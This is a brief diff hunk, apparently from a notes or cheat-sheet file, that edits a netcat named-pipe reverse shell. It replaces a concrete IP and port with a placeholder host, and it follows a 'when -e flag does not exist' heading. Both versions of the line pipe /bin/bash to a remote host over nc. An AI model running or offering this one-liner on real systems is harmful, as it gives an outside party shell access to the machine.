@@ -25,6 +25,6 @@ sudo pmset sleep 15
 - When -e flag does not exist:
 ```
 mknod /tmp/datapipe p
-/bin/bash 0</tmp/datapipe |nc 192.168.18.238 8989 1>/tmp/datapipe
+/bin/bash 0</tmp/datapipe | nc remote.host.com port 1>/tmp/datapipe
 ```
 
